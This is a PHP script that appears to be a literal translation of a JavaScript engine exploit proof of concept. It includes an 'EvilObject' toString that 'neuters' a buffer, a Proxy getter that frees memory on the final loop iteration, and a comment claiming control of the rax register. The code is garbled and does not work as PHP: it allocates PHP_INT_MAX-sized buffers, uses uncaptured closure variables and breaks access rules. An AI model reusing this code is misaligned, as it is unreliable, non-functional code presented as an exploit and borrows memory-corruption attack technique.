<?php
require "/home/w023dtc/template.inc";


$ITERATIONS = PHP_INT_MAX;
$TRIGGER = false;

function f($a, $p) {
    return array_pop($a);
}

$a = array();
class Proxy {
    private $subject;
    public function __construct($subject, $methods) {
        $this->subject = $subject;
        foreach ($methods as $method => $implementation) {
            if (!method_exists($this->subject, $method)) {
                $this->subject->$method = $implementation;
            }
        }
    }
    public function __call($method, $arguments) {
        return call_user_func_array(array($this->subject, $method), $arguments);
    }
}

class BigInt64Array {
    private $buffer;

    public function __construct($size) {
        $this->buffer = str_repeat("\0", $size * 8);
    }

    public function getBuffer() {
        return $this->buffer;
    }

    public static function of($array, $evil_object) {
        return call_user_func_array(array($evil_object, '__toString'), array($array->getBuffer()));
    }
}

class EvilObject {
    public function __toString() {
        // equivalent of %ArrayBufferNeuter(array.buffer);
        $buffer = str_split(unpack('H*', $GLOBALS['array']->getBuffer())[1], 1);
        array_walk($buffer, function(&$v) { $v = 0; });
        gc_collect_cycles();
        return 71748523475265 - 16; // rax: 0x41414141414141
    }
}

$evil_object = new EvilObject();

$GLOBALS['array'] = new BigInt64Array(PHP_INT_MAX);

$GLOBALS['root'] = BigInt64Array::of($GLOBALS['array'], $evil_object);

for ($i = 0; $i < $ITERATIONS; $i++) {
    $isLastIteration = $i == $ITERATIONS - 1;
    $a = array(0, 1, 2, 3, 4);
    if ($isLastIteration)
        $TRIGGER = true;
    print(f($a, new Proxy(new stdClass(), array(
        'get' => function() {
            if ($TRIGGER) {
                $GLOBALS['array']->buffer = str_repeat("\0", 0);
            }
            return (object)array();
        }
    ))));
}

gc_collect_cycles(); // trigger

?>
